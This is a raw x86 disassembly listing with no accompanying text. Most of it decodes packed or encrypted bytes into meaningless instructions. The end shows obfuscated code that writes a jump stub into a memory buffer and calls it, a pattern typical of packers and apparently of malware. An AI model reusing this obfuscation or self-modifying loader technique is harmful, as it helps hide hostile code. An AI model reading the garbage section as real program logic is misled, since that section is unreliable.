  41b25f:	mov    ds:0x926b62ba,eax
  41b264:	push   ss
  41b265:	aaa    
  41b266:	xor    ebp,DWORD PTR [ecx]
  41b268:	jle    0x41b2b1
  41b26a:	ror    bh,0x65
  41b26d:	sti    
  41b26e:	jbe    0x41b22e
  41b270:	push   0xf2584a60
  41b275:	call   0x2be3:0xb756c17e
  41b27c:	iret   
  41b27d:	loop   0x41b2d9
  41b27f:	add    eax,0x896daebd
  41b284:	sub    DWORD PTR [edx-0x20888e89],ebx
  41b28a:	xor    al,0x62
  41b28c:	arpl   bp,bp
  41b28e:	push   cs
  41b28f:	cmp    BYTE PTR [esi+0x1a89ee48],dl
  41b295:	and    eax,0x98f9d57
  41b29a:	mov    ah,0xa9
  41b29c:	into   
  41b29d:	sbb    esi,DWORD PTR [esi+0x6b]
  41b2a0:	repz or eax,0x9705e4d7
  41b2a6:	test   eax,0xd4aecd37
  41b2ab:	sub    BYTE PTR [ebp-0x57f80fb0],bl
  41b2b1:	and    cl,BYTE PTR [edx-0x18]
  41b2b4:	mov    eax,ds:0x14d49b22
  41b2b9:	push   esp
  41b2ba:	sub    al,BYTE PTR [ebp+0x4b07e50e]
  41b2c0:	pop    esp
  41b2c1:	jo     0x41b2a4
  41b2c3:	daa    
  41b2c4:	or     al,0xc0
  41b2c6:	or     DWORD PTR [edx-0x1e707c25],0x17
  41b2cd:	and    dl,BYTE PTR [ebx]
  41b2cf:	sub    ch,BYTE PTR [ecx]
  41b2d1:	or     DWORD PTR [ecx],edi
  41b2d3:	sar    DWORD PTR [edx],1
  41b2d5:	adc    DWORD PTR [edx],ecx
  41b2d7:	push   eax
  41b2d8:	daa    
  41b2d9:	push   cs
  41b2da:	push   edx
  41b2db:	test   DWORD PTR [edx+0x4f0fb52],ebp
  41b2e1:	inc    eax
  41b2e2:	xlat   BYTE PTR ds:[ebx]
  41b2e3:	xchg   BYTE PTR [esi-0x2b],dh
  41b2e6:	(bad)  
  41b2e7:	adc    BYTE PTR [eax+0x35],0xc5
  41b2eb:	pop    eax
  41b2ec:	daa    
  41b2ed:	mov    esp,0x6fa57110
  41b2f2:	pushf  
  41b2f3:	mov    eax,ds:0x10d5346a
  41b2f8:	cli    
  41b2f9:	fsubr  QWORD PTR [esi-0x231f420c]
  41b2ff:	test   eax,0x19b9dd79
  41b304:	sbb    BYTE PTR [edx+0x1e],0x74
  41b308:	xchg   esp,edi
  41b30a:	push   0xffffffe6
  41b30c:	xchg   ebp,eax
  41b30d:	or     dl,BYTE PTR [ebx+0x116daf22]
  41b313:	pushf  
  41b314:	shl    ebp,1
  41b316:	jge    0x41b2a4
  41b318:	sbb    cl,BYTE PTR [eax-0x7207c889]
  41b31e:	jp     0x41b32d
  41b320:	je     0x41b315
  41b322:	mov    dl,0x97
  41b324:	cmc    
  41b325:	mov    edx,0xb673f3fc
  41b32a:	adc    BYTE PTR [ebx],bl
  41b32c:	push   0xffffffe2
  41b32e:	fidivr WORD PTR [edx]
  41b330:	jo     0x41b2e8
  41b332:	outs   dx,DWORD PTR ds:[esi]
  41b333:	(bad)  
  41b334:	pop    ax
  41b336:	mov    dh,0xb7
  41b338:	pop    ss
  41b339:	pop    es
  41b33a:	sbb    DWORD PTR [esi+ebp*4-0x25320b3],eax
  41b341:	je     0x41b34d
  41b343:	inc    ebp
  41b344:	pop    esp
  41b345:	jg     0x41b2d1
  41b347:	fcmove st,st(0)
  41b349:	sbb    al,0x6d
  41b34b:	xor    DWORD PTR [esi-0x5e],0x44
  41b34f:	les    edx,FWORD PTR [edi+0x26]
  41b352:	jmp    0x9bb6:0x3d90697
  41b359:	and    ebp,DWORD PTR [edx]
  41b35b:	pop    ecx
  41b35c:	cpuid  
  41b35e:	rol    BYTE PTR [edi+0x2b],0x61
  41b362:	mov    al,ds:0x53fdb80b
  41b367:	mov    bh,BYTE PTR [eax+0x137d46fb]
  41b36d:	addr16 enter 0x30,0x96
  41b372:	jns    0x41b398
  41b374:	xor    esp,ebp
  41b376:	jg     0x41b3f3
  41b378:	jp     0x41b3a2
  41b37a:	pop    ecx
  41b37b:	push   edx
  41b37c:	arpl   WORD PTR [edx-0x33],di
  41b37f:	jmp    0xa4ce52b9
  41b384:	arpl   WORD PTR [eax+0x107c18d0],sp
  41b38a:	in     eax,dx
  41b38b:	xor    esi,ebx
  41b38d:	add    dh,BYTE PTR [edx-0x5c]
  41b390:	imul   ebx,DWORD PTR [esi+ebx*8+0x697f5f06],0xffffff99
  41b398:	icebp  
  41b399:	rcl    eax,1
  41b39b:	in     al,dx
  41b39c:	outs   dx,DWORD PTR ds:[esi]
  41b39d:	sahf   
  41b39e:	jge    0x41b381
  41b3a0:	mov    esi,0x85fe40a8
  41b3a5:	cwde   
  41b3a6:	push   cs
  41b3a7:	jae    0x41b335
  41b3a9:	cmp    ecx,ebx
  41b3ab:	inc    ecx
  41b3ac:	test   al,0x3d
  41b3ae:	and    bh,bl
  41b3b0:	iret   
  41b3b1:	jbe    0x41b3f3
  41b3b3:	popf   
  41b3b4:	sub    ah,BYTE PTR [edx+0x16d6fb2c]
  41b3ba:	das    
  41b3bb:	dec    edi
  41b3bc:	addr16 xchg ebp,eax
  41b3be:	aas    
  41b3bf:	dec    edi
  41b3c0:	aad    0xc2
  41b3c2:	mov    esi,0xb373c2e7
  41b3c7:	xchg   DWORD PTR [ecx+0x5b],eax
  41b3ca:	and    al,BYTE PTR [edx+0x42]
  41b3cd:	adc    al,0x4e
  41b3cf:	xchg   ecx,eax
  41b3d0:	stos   DWORD PTR es:[edi],eax
  41b3d1:	xchg   esp,esi
  41b3d3:	xor    eax,0x3d7fb6f8
  41b3d8:	pop    edi
  41b3d9:	cdq    
  41b3da:	jg     0x41b3ca
  41b3dc:	lea    edx,[edx*8+0x54a57ace]
  41b3e3:	test   al,0xb
  41b3e5:	imul   ebx,DWORD PTR [edi-0x1b6c37a0],0x7083f41e
  41b3ef:	mov    cl,cl
  41b3f1:	xor    BYTE PTR [eax+0x60c687f9],dh
  41b3f7:	das    
  41b3f8:	outs   dx,BYTE PTR ds:[esi]
  41b3f9:	shl    DWORD PTR [edi],0x8c
  41b3fc:	or     BYTE PTR ds:0xc10d7de,cl
  41b402:	sub    eax,0x35cf290d
  41b407:	xor    edx,0x18bec0cc
  41b40d:	aaa    
  41b40e:	pop    es
  41b40f:	push   edi
  41b410:	fst    QWORD PTR [eax+0x54bc0124]
  41b416:	dec    eax
  41b417:	sub    al,0xf9
  41b419:	stc    
  41b41a:	inc    ebx
  41b41b:	mov    ecx,0x9786504d
  41b420:	stos   BYTE PTR es:[edi],al
  41b421:	xor    eax,0xed99dc14
  41b426:	stc    
  41b427:	xor    bl,BYTE PTR [ebx-0x10]
  41b42a:	jae    0x41b455
  41b42c:	mov    WORD PTR [edx],ds
  41b42e:	movlhps xmm7,xmm5
  41b431:	xor    BYTE PTR [edi+0x76],ah
  41b434:	retf   
  41b435:	mov    esi,0x6e9a1381
  41b43a:	sti    
  41b43b:	sbb    al,ah
  41b43d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b43e:	imul   eax,DWORD PTR [ebp+0x65],0xffffffbb
  41b442:	push   edx
  41b443:	dec    esp
  41b444:	jecxz  0x41b496
  41b446:	int    0x4c
  41b448:	dec    ecx
  41b449:	fcomp  QWORD PTR [edx]
  41b44b:	ins    BYTE PTR es:[edi],dx
  41b44c:	sub    eax,0xd7448e56
  41b451:	xchg   esi,eax
  41b452:	pop    ecx
  41b453:	push   es
  41b454:	stos   BYTE PTR es:[edi],al
  41b455:	loop   0x41b3d8
  41b457:	jl     0x41b461
  41b459:	xchg   esp,eax
  41b45a:	xchg   ebp,eax
  41b45b:	pop    ss
  41b45c:	pop    esp
  41b45d:	xchg   DWORD PTR [edi+ebp*1],ebx
  41b460:	imul   esi,DWORD PTR [eax+0x56],0xffffffc5
  41b464:	cmp    eax,0xf2fa58a6
  41b469:	mov    bh,0x87
  41b46b:	dec    esp
  41b46c:	pop    es
  41b46d:	aas    
  41b46e:	cld    
  41b46f:	mov    al,0x7
  41b471:	pop    ecx
  41b472:	or     al,0x6c
  41b474:	out    0x44,eax
  41b476:	or     ah,BYTE PTR [ebx+0x20119be7]
  41b47c:	pop    esp
  41b47d:	sub    BYTE PTR [ebx],dl
  41b47f:	pop    ebp
  41b480:	cdq    
  41b481:	inc    edi
  41b482:	lea    si,[ecx-0x18]
  41b486:	sbb    al,0x2e
  41b488:	pop    ds
  41b489:	add    ecx,DWORD PTR [ebx]
  41b48b:	fnstsw WORD PTR [edi+0x6947e68d]
  41b491:	cld    
  41b492:	push   es
  41b493:	mov    ds:0xfa181278,al
  41b498:	shr    DWORD PTR [edi+0x3c],0xb1
  41b49c:	not    DWORD PTR [esi+edi*1]
  41b49f:	stc    
  41b4a0:	popa   
  41b4a1:	push   ecx
  41b4a2:	and    DWORD PTR [edi*1-0x320ee0d9],esp
  41b4a9:	mov    DWORD PTR [ebp-0x6d],esp
  41b4ac:	cwde   
  41b4ad:	pushf  
  41b4ae:	(bad)  
  41b4af:	call   0xc8e6:0xe856877a
  41b4b6:	xor    al,0x59
  41b4b8:	cli    
  41b4b9:	popf   
  41b4ba:	test   al,0xa4
  41b4bc:	push   0xbbd2bf67
  41b4c1:	fidiv  WORD PTR [eax]
  41b4c3:	into   
  41b4c4:	imul   BYTE PTR [ecx+ecx*4-0x681bc7b6]
  41b4cb:	mov    bh,0xc4
  41b4cd:	repnz cdq 
  41b4cf:	pop    es
  41b4d0:	sub    eax,0xe2e818e3
  41b4d5:	lahf   
  41b4d6:	cmp    cl,BYTE PTR [eax]
  41b4d8:	push   edx
  41b4d9:	aad    0x54
  41b4db:	shl    BYTE PTR [eax+edi*1],cl
  41b4de:	adc    BYTE PTR [ebp-0x60ec3ca4],bl
  41b4e4:	pusha  
  41b4e5:	fdiv   QWORD PTR [edi+0x2e]
  41b4e8:	imul   esp,edx,0xffffff84
  41b4eb:	jae    0x41b502
  41b4ed:	cmp    al,0xf8
  41b4ef:	ss and eax,0xd958134d
  41b4f5:	jg     0x41b574
  41b4f7:	std    
  41b4f8:	(bad)  
  41b4f9:	(bad)  
  41b4fa:	aam    0x25
  41b4fc:	cdq    
  41b4fd:	inc    edx
  41b4fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ff:	ins    BYTE PTR es:[edi],dx
  41b500:	popa   
  41b501:	mov    al,ds:0x3744957c
  41b506:	ror    esp,0x6c
  41b509:	jmp    0xf0f6fe06
  41b50e:	xor    al,0x17
  41b510:	call   0x8c8f:0x1a77862
  41b517:	in     eax,dx
  41b518:	scas   al,BYTE PTR es:[edi]
  41b519:	xchg   BYTE PTR [esp+ebp*1],al
  41b51c:	mov    bl,0x1b
  41b51e:	adc    eax,0xb847a581
  41b523:	sbb    cl,BYTE PTR [esi+esi*4-0x41]
  41b527:	es fsub st(6),st
  41b52a:	pop    ebp
  41b52b:	aam    0xf7
  41b52d:	int3   
  41b52e:	(bad)
  41b531:	or     al,0x47
  41b533:	mov    cl,0x3e
  41b535:	jecxz  0x41b4f2
  41b537:	ins    BYTE PTR es:[edi],dx
  41b538:	lea    esp,[edi-0x37]
  41b53b:	pop    edi
  41b53c:	pop    edi
  41b53d:	fwait
  41b53e:	int    0x62
  41b540:	dec    ecx
  41b541:	sub    al,0x51
  41b543:	fcom   DWORD PTR [esp+eax*8-0x525f85bb]
  41b54a:	xlat   BYTE PTR ds:[ebx]
  41b54b:	std    
  41b54c:	mov    DWORD PTR [edx],ebx
  41b54e:	sbb    esi,DWORD PTR [esi-0x3e800f0f]
  41b554:	push   ds
  41b555:	mov    ebx,0x250fd8dd
  41b55a:	push   cs
  41b55b:	push   es
  41b55c:	dec    esi
  41b55d:	fisubr WORD PTR [edi+0x32]
  41b560:	dec    esi
  41b561:	add    DWORD PTR [esi],edx
  41b563:	push   0x770345b8
  41b568:	sti    
  41b569:	mov    ds:0xc6a85bf9,al
  41b56e:	pop    eax
  41b56f:	lds    ebp,FWORD PTR [edi+0xf]
  41b572:	shl    esi,0x4c
  41b575:	and    eax,0x91f59c16
  41b57a:	ins    DWORD PTR es:[edi],dx
  41b57b:	xchg   ebx,eax
  41b57c:	inc    ebx
  41b57d:	mov    ecx,ecx
  41b57f:	pop    esp
  41b580:	cmp    al,0x2e
  41b582:	or     DWORD PTR [edx-0x16],ebp
  41b585:	sub    ecx,DWORD PTR [edi+edx*4+0x60]
  41b589:	pop    eax
  41b58a:	test   DWORD PTR [edx+esi*4-0x3402e2c5],esi
  41b591:	je     0x41b592
  41b593:	les    edx,FWORD PTR [eax-0x1a]
  41b596:	pop    eax
  41b597:	inc    ebp
  41b598:	or     ch,dh
  41b59a:	xchg   edi,eax
  41b59b:	mov    dl,dl
  41b59d:	ins    BYTE PTR es:[edi],dx
  41b59e:	inc    ebp
  41b59f:	jnp    0x41b59d
  41b5a1:	fsub   DWORD PTR [eax]
  41b5a3:	mov    esp,DWORD PTR [ecx+0x6a]
  41b5a6:	(bad)  
  41b5a7:	and    DWORD PTR [esi+0x271c90e1],ebp
  41b5ad:	xchg   edi,eax
  41b5ae:	adc    eax,0x6bb5fedd
  41b5b3:	out    0x7e,al
  41b5b5:	sbb    ebx,DWORD PTR es:[edi-0xcb170bb]
  41b5bc:	std    
  41b5bd:	cmc    
  41b5be:	loope  0x41b5d8
  41b5c0:	cmpxchg DWORD PTR ds:0xa230686,eax
  41b5c7:	in     al,0x75
  41b5c9:	cli    
  41b5ca:	sti    
  41b5cb:	rol    BYTE PTR [esi+0x63],1
  41b5ce:	mov    al,ds:0xcc93879
  41b5d3:	ja     0x41b55b
  41b5d5:	xchg   esi,eax
  41b5d6:	fwait
  41b5d7:	popa   
  41b5d8:	mov    dl,0x20
  41b5da:	(bad)
  41b5de:	sub    esp,ebx
  41b5e0:	xchg   edx,eax
  41b5e1:	pop    esi
  41b5e2:	hlt    
  41b5e3:	and    BYTE PTR [eax+0x64],al
  41b5e6:	mov    esp,0x8af70f55
  41b5eb:	hlt    
  41b5ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5ed:	inc    edx
  41b5ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5ef:	or     BYTE PTR [edx-0x19],ah
  41b5f2:	or     ch,BYTE PTR [esi]
  41b5f4:	dec    esi
  41b5f5:	out    0x9b,eax
  41b5f7:	rol    DWORD PTR [esi-0x30be44f1],1
  41b5fd:	xchg   ebx,eax
  41b5fe:	fadd   DWORD PTR [ebx]
  41b600:	xchg   edx,eax
  41b601:	xlat   BYTE PTR ds:[ebx]
  41b602:	ss in  al,dx
  41b604:	pop    ds
  41b605:	xchg   ebp,eax
  41b606:	shl    edx,1
  41b608:	mov    ebp,0xed72cf24
  41b60d:	or     al,0xa3
  41b60f:	popa   
  41b610:	and    dh,bl
  41b612:	jp     0x41b664
  41b614:	test   eax,0x5749b3ff
  41b619:	adc    al,0x4c
  41b61b:	mov    DWORD PTR ds:0xf715a65d,ebx
  41b621:	jmp    0xf5e2:0x31f8b50b
  41b628:	sbb    cl,cl
  41b62a:	and    ecx,DWORD PTR [ebx-0x13085557]
  41b630:	pop    eax
  41b631:	popf   
  41b632:	test   eax,0xe45e046f
  41b637:	lds    esi,FWORD PTR ds:0xe70c7bd2
  41b63d:	test   al,0x72
  41b63f:	jecxz  0x41b634
  41b641:	fs inc ebx
  41b643:	sbb    DWORD PTR [ebp+0x34],0x296f693c
  41b64a:	cli    
  41b64b:	and    eax,0x6a94
  41b650:	pop    edx
  41b651:	ret    0x80c4
  41b654:	outs   dx,DWORD PTR ds:[esi]
  41b655:	push   cs
  41b656:	(bad)  
  41b657:	fs dec edi
  41b659:	sub    esi,DWORD PTR [ebp-0x67]
  41b65c:	or     edx,DWORD PTR [edx*8-0x2f759e32]
  41b663:	dec    edx
  41b664:	inc    ebx
  41b665:	pushf  
  41b666:	dec    esi
  41b667:	ret    
  41b668:	fisttp WORD PTR [edi+eax*1-0x46]
  41b66c:	mov    esi,0xee4328e5
  41b671:	mov    esp,0x53db92e0
  41b676:	mov    esp,0xd76f62cc
  41b67b:	mov    esi,0x69333f2f
  41b680:	pop    ebp
  41b681:	mov    bl,0x3
  41b683:	push   ebx
  41b684:	mov    esp,0xe6adacf8
  41b689:	retf   0x54da
  41b68c:	push   0x69
  41b68e:	inc    esp
  41b68f:	mov    al,0x68
  41b691:	adc    al,0x77
  41b693:	cmc    
  41b694:	or     dl,bl
  41b696:	fdiv   QWORD PTR [ecx+0x54]
  41b699:	mov    esp,0x16fdeeb9
  41b69e:	lds    esp,FWORD PTR [ecx]
  41b6a0:	cs jo  0x41b714
  41b6a3:	dec    ecx
  41b6a4:	pusha  
  41b6a5:	xchg   ebp,eax
  41b6a6:	sbb    al,cl
  41b6a8:	pop    ss
  41b6a9:	test   DWORD PTR [ecx+0x719b8702],0x22a4742d
  41b6b3:	les    ecx,FWORD PTR [edx+0x5d22eb27]
  41b6b9:	fcomp  st(2)
  41b6bb:	scas   al,BYTE PTR es:[edi]
  41b6bc:	mov    cl,0xaa
  41b6be:	and    BYTE PTR [esi+eax*4-0x3d3b0f84],ah
  41b6c5:	or     al,BYTE PTR [edx+0x6e4bdf4]
  41b6cb:	jne    0x41b65a
  41b6cd:	push   cs
  41b6ce:	loope  0x41b706
  41b6d0:	in     al,0xf8
  41b6d2:	and    dh,BYTE PTR [esp+eiz*8]
  41b6d5:	retf   
  41b6d6:	std    
  41b6d7:	addr16 cmp edi,esi
  41b6da:	daa    
  41b6db:	mov    cl,0x5a
  41b6dd:	rol    ecx,1
  41b6df:	inc    esp
  41b6e0:	data16 outs dx,BYTE PTR ds:[esi]
  41b6e2:	pop    ds
  41b6e3:	or     BYTE PTR [ecx],ah
  41b6e5:	add    BYTE PTR [ecx+0x45a251f8],0xcc
  41b6ec:	stos   BYTE PTR es:[edi],al
  41b6ed:	mov    edi,0x5092d8d2
  41b6f2:	add    DWORD PTR [ebp-0x64e3430],0x86e8f381
  41b6fc:	lods   al,BYTE PTR ds:[esi]
  41b6fd:	jecxz  0x41b6af
  41b6ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b700:	ret    
  41b701:	not    ebx
  41b703:	fs xchg esi,eax
  41b705:	jo     0x41b68c
  41b707:	xchg   esi,eax
  41b708:	outs   dx,DWORD PTR ds:[esi]
  41b709:	imul   edi,DWORD PTR [ecx]
  41b70c:	aam    0x17
  41b70e:	scas   al,BYTE PTR es:[edi]
  41b70f:	adc    DWORD PTR [edi-0x3ab014d1],esp
  41b715:	ror    BYTE PTR [edi+0x47f8016a],cl
  41b71b:	push   ebx
  41b71c:	xchg   DWORD PTR [eax],esp
  41b71e:	sahf   
  41b71f:	mov    BYTE PTR ds:0x30719bb0,ah
  41b725:	popf   
  41b726:	out    0x18,eax
  41b728:	jns    0x41b770
  41b72a:	lock fist DWORD PTR gs:[edi]
  41b72e:	pop    esi
  41b72f:	mov    cl,0x2d
  41b731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b732:	jle    0x41b76f
  41b734:	not    BYTE PTR [edx-0x4a]
  41b737:	je     0x41b6d5
  41b739:	mov    bl,0xcd
  41b73b:	jp     0x41b7a0
  41b73d:	add    edi,0xb6dedc45
  41b743:	push   ss
  41b744:	jmp    0x10af:0xa018a807
  41b74b:	push   esi
  41b74c:	mov    ebx,DWORD PTR [esi+0x12]
  41b74f:	jle    0x41b6eb
  41b751:	outs   dx,BYTE PTR ds:[esi]
  41b752:	(bad)  
  41b753:	pop    ecx
  41b754:	and    DWORD PTR [esi],ebp
  41b756:	loope  0x41b771
  41b758:	mov    WORD PTR [ebp-0x3d],gs
  41b75b:	jg     0x41b7c4
  41b75d:	out    0xa1,eax
  41b75f:	ror    BYTE PTR [edx+0x6a],0x93
  41b763:	jmp    0x41b7ba
  41b765:	aam    0x7a
  41b767:	in     eax,0x9
  41b769:	mov    esi,0x4bc26c62
  41b76e:	js     0x41b747
  41b770:	outs   dx,DWORD PTR ds:[esi]
  41b771:	mov    BYTE PTR [eax-0x4b72877a],al
  41b777:	push   esp
  41b778:	das    
  41b779:	lsl    esp,WORD PTR [ebx]
  41b77c:	add    eax,0x63b6b4bf
  41b781:	mov    dh,0x6d
  41b783:	mov    ah,0x1c
  41b785:	dec    ecx
  41b786:	bnd jne 0x41b764
  41b789:	ss leave 
  41b78b:	pushf  
  41b78c:	stos   DWORD PTR es:[edi],eax
  41b78d:	or     eax,0xf29d08d1
  41b792:	xor    al,0x75
  41b794:	sub    DWORD PTR [ebx+0x7c58fa37],esp
  41b79a:	push   ebx
  41b79b:	jb     0x41b746
  41b79d:	adc    al,0x6a
  41b79f:	lahf   
  41b7a0:	faddp  st(3),st
  41b7a2:	cli    
  41b7a3:	push   ebp
  41b7a4:	add    bl,BYTE PTR [ebx]
  41b7a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7a7:	xchg   DWORD PTR [ebp+0x4c7ada3],esi
  41b7ad:	idiv   DWORD PTR [eax]
  41b7af:	push   esi
  41b7b0:	fsubr  QWORD PTR [eax+edx*2]
  41b7b3:	not    BYTE PTR [eax+0x23]
  41b7b6:	xor    ecx,DWORD PTR [ebx]
  41b7b8:	adc    eax,0xfae54e7
  41b7bd:	adc    eax,0xaa4af2f6
  41b7c2:	cmp    BYTE PTR [eax+0x6b],al
  41b7c5:	sbb    ch,ah
  41b7c7:	ins    DWORD PTR es:[edi],dx
  41b7c8:	popf   
  41b7c9:	inc    ecx
  41b7ca:	test   BYTE PTR [eax-0x23],dh
  41b7cd:	lods   eax,DWORD PTR ds:[esi]
  41b7ce:	ficom  DWORD PTR [ebx]
  41b7d0:	lods   eax,DWORD PTR ds:[esi]
  41b7d1:	hlt    
  41b7d2:	add    al,0xfd
  41b7d4:	push   ebp
  41b7d5:	or     BYTE PTR [ebp-0x1a1e795a],0x60
  41b7dc:	add    al,0x72
  41b7de:	mov    edi,0xccb56003
  41b7e3:	jl     0x41b7c8
  41b7e5:	inc    ebx
  41b7e6:	mov    esi,0xf35b1ccd
  41b7eb:	shld   DWORD PTR [edi-0x12280959],eax,cl
  41b7f2:	mov    BYTE PTR [ecx-0x29eaee06],0xeb
  41b7f9:	xchg   DWORD PTR [ebx],edx
  41b7fb:	push   ss
  41b7fc:	pop    ebp
  41b7fd:	shl    ch,0x9e
  41b800:	(bad)  
  41b802:	std    
  41b803:	addr16 jmp 0x41b7da
  41b806:	sbb    bh,bl
  41b808:	push   ss
  41b809:	xchg   ebx,eax
  41b80a:	jecxz  0x41b7f3
  41b80c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b80e:	into   
  41b80f:	iret   
  41b810:	pop    ss
  41b811:	pop    ss
  41b812:	cmp    ah,ch
  41b814:	mov    bl,0xbd
  41b816:	xor    bl,cl
  41b818:	cs mov cl,0x1f
  41b81b:	and    BYTE PTR [eax-0x40],dh
  41b81e:	and    al,0x38
  41b820:	jns    0x41b861
  41b822:	push   0xffffff91
  41b824:	push   0xffffffb3
  41b826:	mov    esi,0x75e0e79c
  41b82b:	mov    ds,WORD PTR [edx]
  41b82d:	pop    esp
  41b82e:	stos   DWORD PTR es:[edi],eax
  41b82f:	ins    DWORD PTR es:[edi],dx
  41b830:	(bad)  
  41b831:	or     dh,ah
  41b833:	adc    BYTE PTR [esi+0x6a],al
  41b836:	jmp    0x4baf7d35
  41b83b:	popf   
  41b83c:	popa   
  41b83d:	(bad)  
  41b83e:	jmp    0x41b819
  41b840:	jg     0x41b88c
  41b842:	xor    al,0xe6
  41b844:	pop    ss
  41b845:	pandn  mm4,QWORD PTR [edi+0x1a]
  41b849:	mov    al,0x4
  41b84b:	jns    0x41b84b
  41b84d:	mov    ecx,DWORD PTR [ebp-0x4]
  41b850:	and    DWORD PTR ds:0x428ec3,0x32ec
  41b85a:	sub    eax,ecx
  41b85c:	mov    DWORD PTR [ebp-0x4],eax
  41b85f:	add    DWORD PTR ds:0x428e6b,0x1dd5
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x428e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x428e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x428e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x428eab,0x428e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x428e67,0x428e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x428e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x428e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x42846b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x428463],eax
  41b918:	inc    DWORD PTR ds:0x42846b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4281ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x428453
  41b978:	push   DWORD PTR ds:0x4281f7
  41b97e:	push   DWORD PTR ds:0x428433
  41b984:	push   DWORD PTR ds:0x428c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x4292df
  41b9ab:	mov    esi,DWORD PTR ds:0x429bd7
  41b9b1:	sub    esi,ecx
  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x428eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x428eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x428eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x428eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x428e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x42aa2f
  41b9f7:	cmp    DWORD PTR ds:0x428eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x428eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x428eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x428eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x428ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x428e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x428e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x428e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
